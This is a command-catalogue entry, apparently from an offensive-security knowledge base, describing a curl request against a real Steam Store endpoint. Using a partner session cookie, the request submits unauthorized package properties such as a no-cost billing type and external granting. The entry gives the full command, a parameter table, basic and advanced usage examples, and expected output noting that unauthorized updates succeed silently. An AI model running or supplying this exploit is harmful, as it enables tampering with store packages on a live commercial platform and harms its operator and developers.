---
id: cmd-uuid-001
data: >-
  curl -X POST 'https://store.steampowered.com/store/ajaxpackagesave' -H
  'Cookie: steamLogin=your_partner_session_token_here' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'packageid=TARGET_PACKAGE_ID&extended_info={"billing_type":"no_cost","extended_info":{"type":"externally_grantable"}}'
  -v
name: curl-post-package-update
tags:
  - web-exploit
  - api
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.265Z'
verified: false
validated: true
submitted: true
---
# curl-post-package-update

## Command

```bash
curl -X POST 'https://store.steampowered.com/store/ajaxpackagesave' \
  -H 'Cookie: steamLogin=your_partner_session_token_here' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'packageid=TARGET_PACKAGE_ID&extended_info={"billing_type":"no_cost","extended_info":{"type":"externally_grantable"}}' \
  -v
```

## Description

This command uses curl to send a POST request to the Steam Store's ajaxpackagesave endpoint, exploiting improper access control by submitting unauthorized extended_info properties for a package. It requires a valid partner session cookie and targets a specific package ID to modify properties like enabling external granting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H 'Cookie: ...'` | Authentication header with Steam partner session token | Yes |
| `-H 'Content-Type: ...'` | Sets the request body format | Yes |
| `-d 'packageid=...'` | The ID of the package to update | Yes |
| `-d 'extended_info=...'` | JSON payload with unauthorized properties (e.g., {"type":"externally_grantable"}) | Yes |
| `-v` | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://store.steampowered.com/store/ajaxpackagesave' -H 'Cookie: steamLogin=token' -d 'packageid=12345&extended_info={"type":"externally_grantable"}'
```

### Advanced Usage

```bash
curl -X POST 'https://store.steampowered.com/store/ajaxpackagesave' \
  -H 'Cookie: steamLogin=token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'packageid=12345&extended_info={"billing_type":"no_cost","extended_info":{"type":"externally_grantable","other":"value"}}' \
  --data-urlencode extended_info@payload.json \
  -v
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON like {"success":1,"package":{"id":12345,...}}, confirming the update. Errors may show {"success":0,"error":"Access denied"} if validation catches it, but in the vulnerable state, unauthorized updates succeed silently.

## Related

- [[Related Procedure|procedures/Exploit-Improper-Access-Control-to-Update-Package-Extended-Info]]
